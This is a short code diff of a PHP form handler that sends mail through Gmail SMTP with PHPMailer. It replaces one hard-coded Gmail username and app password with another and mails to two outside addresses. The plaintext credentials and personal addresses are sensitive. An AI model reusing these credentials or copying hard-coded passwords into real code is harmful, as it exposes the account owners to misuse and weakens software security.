@@ -28,14 +28,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
           $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'hindistoryhub396@gmail.com'; // Replace with your email address
-        $mail->Password   = 'fylk gbsb cdgu anwh'; // Replace with your email password
+        $mail->Username   = 'best90960@gmail.com'; // Replace with your email address
+        $mail->Password   = 'kqnv nxov jjek btps'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('hindistoryhub396@gmail.com', 'PROFESSOR');
+        $mail->setFrom('best90960@gmail.com', 'PROFESSOR');
         $mail->addAddress('okieskissdoman@gmail.com');
         $mail->addAddress('subhannizamani51@gmail.com');
 
